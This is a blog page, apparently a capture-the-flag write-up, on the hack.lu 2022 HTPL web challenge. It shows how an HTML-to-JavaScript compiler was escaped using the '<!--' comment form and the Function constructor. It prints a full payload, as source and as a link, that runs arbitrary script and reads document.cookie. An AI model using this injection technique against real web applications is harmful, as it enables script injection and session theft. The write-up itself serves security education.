@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>hack.lu 2022 HTPL wp - kdxcxs&#39; blog</title><meta name="Description" content=""><meta property="og:title" content="hack.lu 2022 HTPL wp" />
+<meta property="og:description" content="Background The challenge implements a language called Hyper Text Programming Language, which defined some tags and compiles them into javascript to make html could do real computation.
+Solution First we noticed that the HTPL code we wrote renders via innerHTML, but the strict CSP makes it unexploitable.
+So let&rsquo;s turn to the HTPL part. The HTPL code&rsquo;s compilation is based on ast, which supports only a few nodes: io, array, function, literals, binary and unary operators, assignments and control flows." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.kdxcxs.com:4433/posts/wp/hack.lu-2022-htpl-wp/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-11-18T00:35:37+08:00" />
+<meta property="article:modified_time" content="2022-11-18T00:35:37+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="hack.lu 2022 HTPL wp"/>
+<meta name="twitter:description" content="Background The challenge implements a language called Hyper Text Programming Language, which defined some tags and compiles them into javascript to make html could do real computation.
+Solution First we noticed that the HTPL code we wrote renders via innerHTML, but the strict CSP makes it unexploitable.
+So let&rsquo;s turn to the HTPL part. The HTPL code&rsquo;s compilation is based on ast, which supports only a few nodes: io, array, function, literals, binary and unary operators, assignments and control flows."/>
+<meta name="application-name" content="kdxcxs&#39; blog">
+<meta name="apple-mobile-web-app-title" content="kdxcxs&#39; blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.kdxcxs.com:4433/posts/wp/hack.lu-2022-htpl-wp/" /><link rel="prev" href="https://blog.kdxcxs.com:4433/posts/server/dpkg-%E5%8D%B8%E8%BD%BD%E6%97%B6%E5%87%BA%E7%8E%B0-error-processing-package/" /><link rel="next" href="https://blog.kdxcxs.com:4433/posts/wp/idekctf-2023-wp/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "hack.lu 2022 HTPL wp",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.kdxcxs.com:4433\/posts\/wp\/hack.lu-2022-htpl-wp\/"
+        },"genre": "posts","keywords": "ctf, ctf-web, wp","wordcount":  315 ,
+        "url": "https:\/\/blog.kdxcxs.com:4433\/posts\/wp\/hack.lu-2022-htpl-wp\/","datePublished": "2022-11-18T00:35:37+08:00","dateModified": "2022-11-18T00:35:37+08:00","publisher": {
+            "@type": "Organization",
+            "name": "kdxcxs"},"author": {
+                "@type": "Person",
+                "name": "kdxcxs"
+            },"description": ""
+    }
+    </script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    </head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="kdxcxs&#39; blog">kdxcxs&#39; blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="kdxcxs&#39; blog">kdxcxs&#39; blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">hack.lu 2022 HTPL wp</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>kdxcxs</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>wp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-11-18">2022-11-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 315 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;<span id="busuanzi_container_page_pv">
+                    <i class="far fa-eye fa-fw"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>&nbsp;次阅读
+                </span>
+            </div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><h1 id="background">Background</h1>
+<p>The challenge implements a language called Hyper Text Programming Language, which defined some tags and compiles them into javascript to make html could do real computation.</p>
+<h1 id="solution">Solution</h1>
+<p>First we noticed that the HTPL code we wrote renders via <code>innerHTML</code>, but the strict CSP makes it unexploitable.</p>
+<p>So let&rsquo;s turn to the HTPL part. The HTPL code&rsquo;s compilation is based on ast, which supports only a few nodes: io, array, function, literals, binary and unary operators, assignments and control flows.</p>
+<p>But it did not support to get elements from an array or something like . operator to access attrs. And we could not make such a function via a valid HTPL.</p>
+<p>As the compiler starts a new line each expression when compiles into javascript, if we could make it comment a part of code, here might be a way to construct a function works like <code>attr()</code>.</p>
+<p>To make it happen, we need to know all <strong>three</strong> types of javascript comments:</p>
+<ul>
+<li><code>/*  */</code></li>
+<li><code>//</code></li>
+<li><code>&lt;!--</code></li>
+</ul>
+<p>We could not make use of first two types, but for the third one, it&rsquo;s a combination of <code>lt</code>, <code>not</code> and <code>dec</code>. Now we can construct a <code>attr()</code> function:</p>
+<pre tabindex="0"><code class="language-HTPL" data-lang="HTPL">&lt;x-func&gt;
+  &lt;x-parameters&gt;
+    &lt;x-identifier&gt;obj&lt;/x-identifier&gt;
+    &lt;x-identifier&gt;key&lt;/x-identifier&gt;
+  &lt;/x-parameters&gt;
+  &lt;x-return&gt;
+    &lt;x-lt&gt;
+      &lt;x-identifier&gt;obj&lt;/x-identifier&gt;
+      &lt;x-not&gt;
+        &lt;x-dec&gt;
+          &lt;x-identifier&gt;x&lt;/x-identifier&gt;
+        &lt;/x-dec&gt;
+      &lt;/x-not&gt;
+    &lt;/x-lt&gt;
+  &lt;/x-return&gt;
+  &lt;x-array&gt;
+    &lt;x-identifier&gt;key&lt;/x-identifier&gt;
+  &lt;/x-array&gt;
+&lt;/x-func&gt;
+</code></pre><p>Which compiles to:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">(</span><span class="nx">$obj$</span><span class="p">,</span> <span class="nx">$key$</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nx">$obj$</span><span class="c">&lt;!--</span><span class="nx">$x$</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">$key$</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// ($obj$, $key$) =&gt; {
+</span></span></span><span class="line"><span class="cl"><span class="c1">//   return $obj$[$key$];
+</span></span></span><span class="line"><span class="cl"><span class="c1">// }
+</span></span></span></code></pre></div><p>Next, we could get <code>Function()</code> by <code>true['constructor']['constructor']</code>, and we have javascript now.</p>
+<h1 id="payload">Payload</h1>
+<p><a href="https://htpl.flu.xxx/write.html#PHgtcHJvZ3JhbT4KICA8eC1jb25zdD4KICAgIDx4LWlkZW50aWZpZXI&#43;YXR0cjwveC1pZGVudGlmaWVyPgogICAgPHgtZnVuYz4KICAgICAgPHgtcGFyYW1ldGVycz4KICAgICAgICA8eC1pZGVudGlmaWVyPm9iajwveC1pZGVudGlmaWVyPgogICAgICAgIDx4LWlkZW50aWZpZXI&#43;a2V5PC94LWlkZW50aWZpZXI&#43;CiAgICAgIDwveC1wYXJhbWV0ZXJzPgogICAgICA8eC1yZXR1cm4&#43;CiAgICAgICAgPHgtbHQ&#43;CiAgICAgICAgICA8eC1pZGVudGlmaWVyPm9iajwveC1pZGVudGlmaWVyPgogICAgICAgICAgPHgtbm90PgogICAgICAgICAgICA8eC1kZWM&#43;CiAgICAgICAgICAgICAgPHgtaWRlbnRpZmllcj54PC94LWlkZW50aWZpZXI&#43;CiAgICAgICAgICAgIDwveC1kZWM&#43;CiAgICAgICAgICA8L3gtbm90PgogICAgICAgIDwveC1sdD4KICAgICAgPC94LXJldHVybj4KICAgICAgPHgtYXJyYXk&#43;CiAgICAgICAgPHgtaWRlbnRpZmllcj5rZXk8L3gtaWRlbnRpZmllcj4KICAgICAgPC94LWFycmF5PgogICAgPC94LWZ1bmM&#43;CiAgPC94LWNvbnN0PgogIDx4LWNvbnN0PgogICAgPHgtaWRlbnRpZmllcj5GdW5jdGlvbjwveC1pZGVudGlmaWVyPgogICAgPHgtY2FsbD4KICAgICAgPHgtaWRlbnRpZmllcj5hdHRyPC94LWlkZW50aWZpZXI&#43;CiAgICAgIDx4LWNhbGw&#43;CiAgICAgICAgPHgtaWRlbnRpZmllcj5hdHRyPC94LWlkZW50aWZpZXI&#43;CiAgICAgICAgPHgtdHJ1ZT48L3gtdHJ1ZT4KICAgICAgICA8eC1zdHI&#43;Y29uc3RydWN0b3I8L3gtc3RyPgogICAgICA8L3gtY2FsbD4KICAgICAgPHgtc3RyPmNvbnN0cnVjdG9yPC94LXN0cj4KICAgIDwveC1jYWxsPgogIDwveC1jb25zdD4KICA8eC1jb25zdD4KICAgIDx4LWlkZW50aWZpZXI&#43;ZXZhbDwveC1pZGVudGlmaWVyPgogICAgPHgtZnVuYz4KICAgICAgPHgtcGFyYW1ldGVycz4KICAgICAgICA8eC1pZGVudGlmaWVyPmNvZGU8L3gtaWRlbnRpZmllcj4KICAgICAgPC94LXBhcmFtZXRlcnM&#43;CiAgICAgIDx4LXJldHVybj4KICAgICAgICA8eC1jYWxsPgogICAgICAgICAgPHgtY2FsbD4KICAgICAgICAgICAgPHgtaWRlbnRpZmllcj5GdW5jdGlvbjwveC1pZGVudGlmaWVyPgogICAgICAgICAgICA8eC1pZGVudGlmaWVyPmNvZGU8L3gtaWRlbnRpZmllcj4KICAgICAgICAgIDwveC1jYWxsPgogICAgICAgIDwveC1jYWxsPgogICAgICA8L3gtcmV0dXJuPgogIDwveC1jb25zdD4KICA8eC13cml0ZT4KICAgIDx4LWNhbGw&#43;CiAgICAgIDx4LWlkZW50aWZpZXI&#43;ZXZhbDwveC1pZGVudGlmaWVyPgogICAgICA8eC1zdHIgY29udGVudGVkaXRhYmxlPSJ0cnVlIj5yZXR1cm4gZG9jdW1lbnQuY29va2llPC94LXN0cj4KICAgIDwveC1jYWxsPgogIDwveC13cml0ZT4KPC94LXByb2dyYW0&#43;" target="_blank" rel="noopener noreffer">url</a></p>
+<pre tabindex="0"><code class="language-HTPL" data-lang="HTPL">&lt;x-program&gt;
+  &lt;x-const&gt;
+    &lt;x-identifier&gt;attr&lt;/x-identifier&gt;
+    &lt;x-func&gt;
+      &lt;x-parameters&gt;
+        &lt;x-identifier&gt;obj&lt;/x-identifier&gt;
+        &lt;x-identifier&gt;key&lt;/x-identifier&gt;
+      &lt;/x-parameters&gt;
+      &lt;x-return&gt;
+        &lt;x-lt&gt;
+          &lt;x-identifier&gt;obj&lt;/x-identifier&gt;
+          &lt;x-not&gt;
+            &lt;x-dec&gt;
+              &lt;x-identifier&gt;x&lt;/x-identifier&gt;
+            &lt;/x-dec&gt;
+          &lt;/x-not&gt;
+        &lt;/x-lt&gt;
+      &lt;/x-return&gt;
+      &lt;x-array&gt;
+        &lt;x-identifier&gt;key&lt;/x-identifier&gt;
+      &lt;/x-array&gt;
+    &lt;/x-func&gt;
+  &lt;/x-const&gt;
+  &lt;x-const&gt;
+    &lt;x-identifier&gt;Function&lt;/x-identifier&gt;
+    &lt;x-call&gt;
+      &lt;x-identifier&gt;attr&lt;/x-identifier&gt;
+      &lt;x-call&gt;
+        &lt;x-identifier&gt;attr&lt;/x-identifier&gt;
+        &lt;x-true&gt;&lt;/x-true&gt;
+        &lt;x-str&gt;constructor&lt;/x-str&gt;
+      &lt;/x-call&gt;
+      &lt;x-str&gt;constructor&lt;/x-str&gt;
+    &lt;/x-call&gt;
+  &lt;/x-const&gt;
+  &lt;x-const&gt;
+    &lt;x-identifier&gt;eval&lt;/x-identifier&gt;
+    &lt;x-func&gt;
+      &lt;x-parameters&gt;
+        &lt;x-identifier&gt;code&lt;/x-identifier&gt;
+      &lt;/x-parameters&gt;
+      &lt;x-return&gt;
+        &lt;x-call&gt;
+          &lt;x-call&gt;
+            &lt;x-identifier&gt;Function&lt;/x-identifier&gt;
+            &lt;x-identifier&gt;code&lt;/x-identifier&gt;
+          &lt;/x-call&gt;
+        &lt;/x-call&gt;
+      &lt;/x-return&gt;
+  &lt;/x-const&gt;
+  &lt;x-write&gt;
+    &lt;x-call&gt;
+      &lt;x-identifier&gt;eval&lt;/x-identifier&gt;
+      &lt;x-str contenteditable=&#34;true&#34;&gt;return document.cookie&lt;/x-str&gt;
+    &lt;/x-call&gt;
+  &lt;/x-write&gt;
+&lt;/x-program&gt;
+</code></pre><h1 id="reference">Reference</h1>
+<ul>
+<li><a href="http://www.javascripter.net/faq/comments.htm" target="_blank" rel="noopener noreffer">Comments in JavaScript (javascripter.net)</a></li>
+<li><a href="https://twitter.com/BitK_" target="_blank" rel="noopener noreffer">BitK (@BitK_) / Twitter</a></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-11-18</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://blog.kdxcxs.com:4433/posts/wp/hack.lu-2022-htpl-wp/" data-title="hack.lu 2022 HTPL wp" data-hashtags="ctf,ctf-web,wp"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://blog.kdxcxs.com:4433/posts/wp/hack.lu-2022-htpl-wp/" data-hashtag="ctf"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://blog.kdxcxs.com:4433/posts/wp/hack.lu-2022-htpl-wp/" data-title="hack.lu 2022 HTPL wp"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://blog.kdxcxs.com:4433/posts/wp/hack.lu-2022-htpl-wp/" data-title="hack.lu 2022 HTPL wp"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://blog.kdxcxs.com:4433/posts/wp/hack.lu-2022-htpl-wp/" data-title="hack.lu 2022 HTPL wp"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">ctf</a>,&nbsp;<a href="/tags/ctf-web/">ctf-web</a>,&nbsp;<a href="/tags/wp/">wp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/server/dpkg-%E5%8D%B8%E8%BD%BD%E6%97%B6%E5%87%BA%E7%8E%B0-error-processing-package/" class="prev" rel="prev" title="dpkg 卸载时出现 error processing package"><i class="fas fa-angle-left fa-fw"></i>dpkg 卸载时出现 error processing package</a>
+            <a href="/posts/wp/idekctf-2023-wp/" class="next" rel="next" title="idekctf 2023 wp">idekctf 2023 wp<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">kdxcxs</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
